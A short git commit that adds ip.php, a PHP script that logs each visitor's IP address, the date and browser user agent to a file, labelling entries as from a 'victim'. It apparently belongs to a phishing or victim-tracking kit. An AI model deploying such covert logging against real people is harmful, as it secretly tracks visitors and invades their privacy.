fe797fed94dd2602fd47736b75f3b0e591faf637
FIkriBotDev <132673557+FIkriBotDev@users.noreply.github.com>
2023-07-20 17:08:12 +0800

    Create ip.php

---
+++ ip.php
@@ -0,0 +1,30 @@
+<?php
+$date = date('d/m/Y');
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
+    }
+$useragent = " Data: ";
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+
+$file = 'ip.txt';
+$victim = "IP: ";
+$fp = fopen($file, 'a');
+
+fwrite($fp, $victim);
+fwrite($fp, $ipaddress);
+fwrite($fp, $date . "\n");
+fwrite($fp, $useragent);
+fwrite($fp, $browser . "\n");
+
+
+fclose($fp);
